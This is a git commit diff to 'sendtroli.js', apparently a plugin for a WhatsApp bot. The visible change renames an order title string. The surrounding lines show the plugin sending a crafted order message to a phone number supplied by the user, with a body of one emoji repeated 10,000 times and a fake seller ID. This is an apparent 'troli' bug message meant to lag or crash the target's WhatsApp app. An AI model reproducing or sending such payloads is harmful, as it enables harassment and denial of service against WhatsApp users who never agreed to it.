a2c57bd11f8551f9dc22dfc900a88000f2aca608
darkdevil3610 <94959564+darkdevil3610@users.noreply.github.com>
2022-03-27 13:22:25 +0530

    Update sendtroli.js

--- plugins/sendtroli.js
+++ plugins/sendtroli.js
@@ -13,7 +13,7 @@ conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Hai Kak', 'co
     status: 1,
     surface: 1,
     message: '🔥'.repeat(10000),
-    orderTitle: 'MAMPUS', // Idk what this does
+    orderTitle: 'GOURAV', // Idk what this does
     sellerJid: '0@s.whatsapp.net' // Seller
    }
   }
